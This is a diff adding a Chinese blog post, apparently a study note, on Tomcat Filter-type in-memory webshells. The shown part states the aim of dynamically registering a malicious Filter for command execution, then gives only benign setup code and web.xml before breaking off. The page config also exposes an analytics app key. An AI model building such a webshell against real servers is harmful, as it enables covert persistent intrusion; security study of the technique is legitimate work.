@@ -1,0 +1,1537 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><progress id="content_progress" value="0"></progress><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/pig.png">
+  <link rel="icon" href="/img/pig.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#3F4B3B">
+  <meta name="author" content="Piggy Sprint">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="内存马系列--Filter型">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内存马系列--Filter型">
+<meta property="og:url" content="http://example.com/2026/04/12/%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97--Filter%E5%9E%8B/index.html">
+<meta property="og:site_name" content="Piggy Sprint&#39;s blog">
+<meta property="og:description" content="内存马系列--Filter型">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260404211402401.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260404215121792.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260404220302091.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405165212040.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405165452275.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405165627495.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405165859647.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405170135583.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405170344020.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405171158010.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405171303190.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405174025678.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405174738823.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405175124663.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405175143315.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405211810675.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405212436544.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405212557737.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405213543040.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405213637869.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405213903858.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405214339115.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405213952008.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406142145020.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406144936839.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406145428366.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406150746288.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406151550263.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406213539632.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406213804370.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406215854816.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406215807762.png">
+<meta property="article:published_time" content="2026-04-12T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-12T14:07:54.000Z">
+<meta property="article:author" content="Piggy Sprint">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="内存马">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260404211402401.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>内存马系列--Filter型 - Piggy Sprint&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+
+
+  
+<link rel="stylesheet" href="/custom/LoadingBar/pace-theme-barber-shop.css">
+<link rel="stylesheet" href="/css/cloudedGlass.css">
+<link rel="stylesheet" href="/custom/ReadingProgress/ReadingProgress.css">
+<link rel="stylesheet" href="/css/Loadanimation.css">
+<link rel="stylesheet" href="/css/StrongInDark.css">
+<link rel="stylesheet" href="/css/TitleNeon.css">
+<link rel="stylesheet" href="/css/TitleGradient.css">
+<link rel="stylesheet" href="/css/ScrollBar.css">
+<link rel="stylesheet" href="https://lib.baomitu.com/font-awesome/6.1.2/css/all.min.css">
+<link rel="stylesheet" href="/css/CodeBlock.css">
+<link rel="stylesheet" href="/css/CodeInLine.css">
+<link rel="stylesheet" href="/css/RandomBanner.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+<link rel="stylesheet" href="/css/Background.css">
+<link rel="stylesheet" href="/css/FrostedGlassBg.css">
+<link rel="stylesheet" href="/css/Sidebar.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":false,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","app_key":"byZ7eSN7DH9MXIyDyXwXE8SE","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+  <script src="/js/backgroundize.js"></script>
+  <script src="/js/injector.js"></script>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.css">
+<style>:root{--hl-color:#abb2bf;--hl-bg:#282c34;--hltools-bg:#21252b;--hltools-color:#bbbbbc;--hlnumber-bg:#282c34;--hlnumber-color:#495162;--hlscrollbar-bg:#373c47;--hlexpand-bg:linear-gradient(180deg,rgba(40,44,52,0.1),rgba(40,44,52,0.9))}</style>
+    <style>
+    .code-expand-btn:not(.expand-done) ~ div.codeblock,
+    .code-expand-btn:not(.expand-done) ~ * div.codeblock {
+      overflow: hidden;
+      height: 360px;
+    }
+    </style>
+  <!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+   <div id="bg-layer"></div>
+  <div id="loader-container"> 
+    <div id="loader" class="loader"></div>
+    <div class="loader-inner">
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/js/RainbowLoading.js" type="text/javascript"></script>
+<link href="/css/RainbowLoading.css" type="text/css" rel="stylesheet"/>
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"> 🐽🐽 Piggy Sprint &#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner/random.webp') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内存马系列--Filter型"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-12 10:00" pubdate>
+          2026年4月12日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          44 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">内存马系列--Filter型</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>参考文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">Java内存马系列-03-Tomcat 之 Filter 型内存马 | Drunkbaby’s Blog</a></li>
+<li>[Java安全-Tomcat 之 Filter 型内存马 - huangdi’s blog](<a target="_blank" rel="noopener" href="https://huang-d1.github.io/2025/10/16/Java%E5%AE%89%E5%85%A8-Tomcat">https://huang-d1.github.io/2025/10/16/Java安全-Tomcat</a> 之 Filter 型内存马&#x2F;)</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Tomcat/Tomcat-Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC.md">JavaSec&#x2F;5.内存马学习&#x2F;Tomcat&#x2F;Tomcat-Filter型内存马&#x2F;Tomcat-Filter型内存马.md at main · Y4tacker&#x2F;JavaSec</a></li>
+<li><a target="_blank" rel="noopener" href="https://xvshifu.github.io/xvsf/posts/java-%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%BA%8C%E7%AF%87---tomcat-%E5%86%85%E5%AD%98%E9%A9%AC/#1-filter-%E5%86%85%E5%AD%98%E9%A9%AC">Java 内存马第二篇 - Tomcat 内存马 | xvsf</a></li>
+<li><a target="_blank" rel="noopener" href="https://bxhhf.github.io/2025/12/07/yuque-hexo-post/%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97--Filter%E5%9E%8B/">内存马系列–Filter型 - bxhhf</a></li>
+</ul>
+</blockquote>
+<p>先回顾一下：Filter主要就是通过自定义过滤器来做到对用户的一些请求进行拦截修改等操作</p>
+<p>流程图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260404211402401.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>从上图可以看出，我们的请求会经过 filter 之后才会到 Servlet ，那么如果我们动态创建一个 filter 并且将其放在最前面，我们的 filter 就会最先执行，当我们在 filter 中添加恶意代码，就会进行命令执行，这样也就成为了一个内存 Webshell</p>
+<p>所以我们后文的目标：<strong>动态注册恶意 Filter，并且将其放到 最前面</strong></p>
+<h1 id="Tomcat-Filter-流程分析"><a href="#Tomcat-Filter-流程分析" class="headerlink" title="Tomcat Filter 流程分析"></a>Tomcat Filter 流程分析</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
+<li>Tomcat 8.5.81</li>
+</ul>
+<p>先起一个servlet</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260404215121792.png" srcset="/img/loading.gif" lazyload alt="image-20260404215121714"></p>
+<p>导入依赖：</p>
+<figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;org.apache.tomcat&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;tomcat-catalina&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;8.5.0&lt;/</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;org.apache.tomcat.embed&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;tomcat-embed-el&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;8.5.15&lt;/</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure>
+
+<p>自定义filter类</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.*</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.IOException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">filter</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Filter</span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> init</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">FilterConfig</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">filterConfig</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Filter 初始构造完成&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> doFilter</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">ServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">servletRequest</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">ServletResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">servletResponse</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">FilterChain</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">filterChain</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;执行了过滤操作&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">filterChain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(servletRequest,servletResponse);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> destroy</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p>然后修改 web.xml 文件，这里我们设置url-pattern为 <code>/filter</code> 即访问 <code>/filter</code> 才会触发</p>
+<figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;?</span><span style="color: #E06C75">xml</span><span style="color: #D19A66"> version</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;1.0&quot;</span><span style="color: #D19A66"> encoding</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;UTF-8&quot;</span><span style="color: #ABB2BF">?&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">web-app</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">xmlns</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span>
+<span class="line"><span style="color: #ABB2BF">         </span><span style="color: #D19A66">xmlns:xsi</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span>
+<span class="line"><span style="color: #ABB2BF">         </span><span style="color: #D19A66">xsi:schemaLocation</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span>
+<span class="line"><span style="color: #ABB2BF">         </span><span style="color: #D19A66">version</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;4.0&quot;</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">filter</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">        &lt;</span><span style="color: #E06C75">filter-name</span><span style="color: #ABB2BF">&gt;filter&lt;/</span><span style="color: #E06C75">filter-name</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">        &lt;</span><span style="color: #E06C75">filter-class</span><span style="color: #ABB2BF">&gt;filter&lt;/</span><span style="color: #E06C75">filter-class</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;/</span><span style="color: #E06C75">filter</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">filter-mapping</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">        &lt;</span><span style="color: #E06C75">filter-name</span><span style="color: #ABB2BF">&gt;filter&lt;/</span><span style="color: #E06C75">filter-name</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">        &lt;</span><span style="color: #E06C75">url-pattern</span><span style="color: #ABB2BF">&gt;/filter&lt;/</span><span style="color: #E06C75">url-pattern</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;/</span><span style="color: #E06C75">filter-mapping</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">web-app</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260404220302091.png" srcset="/img/loading.gif" lazyload alt="image-20260404220302052"></p>
+<h2 id="在访问-filter-之后的流程分析"><a href="#在访问-filter-之后的流程分析" class="headerlink" title="在访问 &#x2F;filter 之后的流程分析"></a>在访问 &#x2F;filter 之后的流程分析</h2><p>先来分析 doFilter() 方法之后的东西</p>
+<p>流程分析之前，需要像刚才导入 Servlet.jar 一样，导入 catalina.jar 这个包，以及 tomcat-websocket 包。<br>导入完毕之后，我们在 filter.java 下的 doFilter 这个地方打断点。并且访问 &#x2F;filter 接口，至此，调试正式开始。 </p>
+<figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">        &lt;</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">            &lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;org.apache.tomcat&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;</span></span>
